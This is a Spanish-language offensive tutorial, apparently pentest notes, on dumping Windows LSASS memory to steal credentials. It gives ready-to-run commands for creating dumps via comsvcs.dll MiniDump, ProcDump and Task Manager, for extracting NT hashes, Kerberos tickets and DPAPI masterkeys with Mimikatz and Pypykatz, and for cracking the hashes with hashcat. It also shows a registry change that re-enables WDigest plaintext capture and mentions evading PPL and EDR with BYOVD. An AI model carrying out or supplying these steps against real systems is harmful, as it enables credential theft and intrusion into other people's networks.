# Atacando LSASS

LSASS (Local Security Authority Subsystem Service) es el proceso más valioso para credential dumping en Windows. Es responsable de validar credenciales, generar tokens de acceso y aplicar políticas de seguridad. Tras el login inicial, LSASS cachea en memoria las credenciales de todas las sesiones activas: hashes NT, tickets Kerberos y, en sistemas legacy o con WDigest activo, contraseñas en texto claro. Volcar su memoria es el objetivo estándar tras comprometer un host con privilegios elevados.

### Prerequisitos

Se necesita al menos uno de los siguientes:

* Privilegio `SeDebugPrivilege` — presente en cuentas de administrador local por defecto
* Token de SYSTEM

### Métodos de volcado

#### Método 1 — Task Manager (GUI, sin herramientas externas)

El propio Task Manager puede crear un volcado de memoria sin necesidad de subir ninguna herramienta:

1. Task Manager → pestaña **Details**
2. Click derecho sobre `lsass.exe` → **Create dump file**
3. Se genera `lsass.DMP` en `%TEMP%`

Se exfiltra el archivo y se procesa offline con Mimikatz o Pypykatz.

#### Método 2 — comsvcs.dll (sin binarios externos)

Usa una DLL nativa de Windows para crear el dump, lo que evita subir herramientas al sistema. Primero hay que obtener el PID de LSASS:

```cmd
# Desde CMD
tasklist /svc | findstr lsass
```

```powershell
# Desde PowerShell
Get-Process lsass
```

Con el PID identificado, crear el dump:

```powershell
# Sustituir 672 por el PID real de lsass.exe
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# Alternativa dinámica — obtiene el PID automáticamente
$pid = (Get-Process lsass).Id
rundll32 C:\windows\system32\comsvcs.dll, MiniDump $pid C:\lsass.dmp full
```

> Los AV/EDR modernos detectan este método como actividad maliciosa. Puede requerir evasión previa.

#### Método 3 — ProcDump (Sysinternals)

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

ProcDump es legítimo y firmado por Microsoft, lo que históricamente reducía la detección, aunque los EDR modernos también lo marcan cuando se usa contra LSASS.

#### Método 4 — Mimikatz en vivo

Si se puede ejecutar Mimikatz directamente en el host comprometido:

```
privilege::debug
sekurlsa::logonpasswords        # hashes NT + contraseñas en claro si WDigest activo
sekurlsa::wdigest               # específicamente WDigest
sekurlsa::kerberos              # tickets Kerberos en memoria
sekurlsa::tspkg                 # credenciales RDP en sesiones activas
```

#### Método 5 — Pypykatz (análisis offline desde Linux)

Pypykatz es una implementación de Mimikatz en Python que permite analizar dumps desde Linux sin necesidad de una máquina Windows:

```bash
pip install pypykatz
pypykatz lsa minidump lsass.dmp
```

### Análisis de la salida de Pypykatz

Pypykatz organiza los resultados por `LogonSession`. Cada sesión activa en el momento del dump aparece con toda la información de credenciales disponible:

```
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
```

#### MSV — hashes NT

El paquete `MSV` (`msv1_0`) es el que valida credenciales contra SAM en logins locales. Es la fuente principal de hashes NT y SHA1 útiles para cracking y Pass-the-Hash:

```
== MSV ==
    Username: bob
    Domain: DESKTOP-33E7O54
    LM: NA
    NT: 64f12cddaa88057e06a81b54e73b949b
    SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
    DPAPI: NA
```

El NT hash extraído aquí es directamente utilizable para cracking con Hashcat (`-m 1000`) o para Pass-the-Hash.

#### WDigest — contraseña en texto claro (legacy)

WDigest estaba activo por defecto en Windows XP–8 y Server 2003–2012. En esos sistemas LSASS guardaba la contraseña en claro. En sistemas modernos está desactivado:

```
== WDIGEST ==
    username bob
    domainname DESKTOP-33E7O54
    password None          ← desactivado en sistemas modernos
```

Si `password` tiene un valor, se tiene la contraseña en texto claro directamente. WDigest puede reactivarse modificando el registro:

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

> En un engagement, si se puede modificar esta clave y esperar a que el usuario vuelva a iniciar sesión, se obtendrá la contraseña en texto claro en el siguiente dump.

#### Kerberos — tickets y claves de sesión

El paquete Kerberos cachea tickets TGT/TGS, contraseñas y claves de cifrado de sesiones activas en dominios AD:

```
== Kerberos ==
    Username: bob
    Domain: DESKTOP-33E7O54
```

Si el usuario tiene sesiones activas en el dominio, los tickets extraídos pueden usarse directamente para Pass-the-Ticket.

#### DPAPI — masterkeys

DPAPI cifra datos sensibles por usuario. Pypykatz extrae las masterkeys de LSASS que permiten descifrar todos los secretos protegidos con DPAPI de ese usuario: contraseñas de Chrome, Outlook, credenciales de RDP guardadas, etc.:

```
== DPAPI ==
    luid 1354633
    key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
    masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
    sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

### Cracking del NT hash

```bash
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
# 64f12cddaa88057e06a81b54e73b949b:Password1
```

### Salida de sekurlsa::logonpasswords (Mimikatz)

```
Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : jsmith
Domain            : EMPRESA
Logon Server      : DC01
        msv :
         * Username : jsmith
         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
        wdigest :
         * Password : (null)     ← WDigest desactivado
        kerberos :
         * Username : jsmith
         * Domain   : EMPRESA.LOCAL
         * Password : (null)
```

### Protecciones y evasión

| Protección                        | Descripción                                 | Impacto                                         |
| --------------------------------- | ------------------------------------------- | ----------------------------------------------- |
| **PPL** (Protected Process Light) | Marca LSASS como proceso protegido          | ProcDump y Task Manager no pueden hacer dump    |
| **Credential Guard**              | Aísla LSASS en VSM (Virtual Secure Mode)    | Hashes NTLM no accesibles desde el SO principal |
| **AV/EDR**                        | Detecta firmas de Mimikatz y acceso a LSASS | Requiere evasión (obfuscación, BYOVD)           |
| **WDigest desactivado**           | `UseLogonCredential=0` en registro          | No hay plaintext en memoria                     |

Para evadir PPL se puede usar el driver `mimidrv.sys` de Mimikatz o técnicas BYOVD (Bring Your Own Vulnerable Driver).

> En entornos con Credential Guard (habitual en Windows 11 Enterprise y servidores modernos), los hashes NTLM no están accesibles en LSASS. Solo se pueden obtener tickets Kerberos, y únicamente si el atacante controla el KDC (DCSync).
